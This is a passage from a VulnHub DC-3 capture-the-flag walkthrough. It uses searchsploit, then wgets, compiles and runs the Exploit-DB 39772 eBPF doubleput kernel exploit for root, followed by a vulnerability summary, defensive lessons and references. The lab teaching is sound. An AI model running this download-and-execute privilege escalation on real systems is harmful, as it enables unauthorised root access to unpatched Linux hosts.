> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit -p 39772
```

Download the exploit bundle onto the target (it is a public PoC archive):

```bash
cd /tmp
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
unzip 39772.zip
```

> **Why it works:** the ZIP contains `exploit.tar`, which holds the compiled sources
> for the `ebpf_mapfd_doubleput_exploit` kernel bug. The exploit abuses a
> use-after-free (`double-fdput`) in the eBPF verifier to overwrite kernel memory
> and gain root.

Extract, compile and run it:

```bash
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

```text
...
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `compile.sh` builds the three small C programs and `doubleput`
> runs the attack, spawning a shell running as **root**. Kernel exploits are noisy
> and can occasionally crash the VM — if this one is unstable on your build, try a
> different Ubuntu 16.04 local exploit (see the References) or re-import the VM.
> "varies by build."

### The final flag

```bash
cd /root
ls
cat the-flag.txt
```

```text
The flag is: ... (well done!)
```

![Root shell and the final flag](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Outdated Joomla 3.7.0 | `http://192.168.56.101/` | Exposes a critical known SQL injection |
| 2 | `com_fields` SQL injection (CVE-2017-8917) | `index.php?...list[fullordering]=` | Unauthenticated read of the whole database |
| 3 | Weak administrator password (bcrypt crackable) | Joomla `#__users` table | Admin panel access (`admin:snoopy`) |
| 4 | Editable PHP in templates | Joomla admin → Template editor | Remote code execution as `www-data` |
| 5 | Unpatched Ubuntu 16.04 / 4.4 kernel | Local kernel (`ebpf doubleput`) | Local privilege escalation to root (EDB 39772) |

## 6. Defensive lessons (blue team)

- **Patch fast, patch often.** CVE-2017-8917 was fixed in Joomla 3.7.1. Subscribe to
  the Joomla Security News feed and update the core, extensions and templates.
- **Use parameterised queries.** The root cause is user input concatenated into SQL.
  Prepared statements (with bound parameters) prevent injection entirely.
- **Enforce strong admin passwords and MFA.** `snoopy` is in `rockyou.txt`; a long,
  unique passphrase plus MFA would have stopped the crack and the login.
- **Harden the admin panel.** IP-restrict `/administrator/`, rename it, and never
  allow PHP editing of templates in production (`disable_template_editing`).
- **Keep the OS and kernel current.** Reboot to apply kernel updates; unsupported
  releases (like 16.04) should be migrated, not left running.
- **Least privilege.** The web server should not be able to write PHP into served
  directories; run it in a sandbox/container with a read-only docroot where possible.
- **Detection ideas:** alert on long/odd `list[fullordering]` values and SQL keywords
  in web parameters (WAF + logs), on new `.php` files written under `templates/`,
  and on outbound connections from `www-data`.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/dc-32,312/>
- CVE-2017-8917 (NVD): <https://nvd.nist.gov/vuln/detail/CVE-2017-8917>
- Joomla security centre — core SQL injection: <https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html>
- Exploit-DB 42033 — Joomla! 3.7.0 `com_fields` SQLi: <https://www.exploit-db.com/exploits/42033>
- Joomblah PoC: <https://github.com/XiphosResearch/exploits/tree/master/Joomblah>
- Rapid7 module — Joomla `com_fields` SQLi RCE: <https://www.rapid7.com/db/modules/exploit/unix/webapp/joomla_comfields_sqli_rce>
- Exploit-DB 39772 — Linux kernel `double-fdput()` BPF privilege escalation: <https://www.exploit-db.com/exploits/39772>
- Community writeups consulted:
  - [DC-3 Walkthrough — s1gh](https://s1gh.sh/vulnhub-dc-3/)
  - [DC-3 Walkthrough — Hacking Articles](https://www.hackingarticles.in/dc-3-walkthrough/)
  - [leegengyu/vulnhub-box-walkthrough (dc-3.md)](https://github.com/leegengyu/vulnhub-box-walkthrough/blob/master/dc-3.md)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan)
- [ ] `images/02-nmap.png` — Nmap scan showing only the web server on port 80
- [ ] `images/03-enum.png` — Joomla 3.7.0 fingerprint / CVE-2017-8917
- [ ] `images/04-foothold.png` — sqlmap dump, cracked hash, reverse shell as `www-data`
- [ ] `images/05-root-flag.png` — kernel exploit root shell and `/root/the-flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
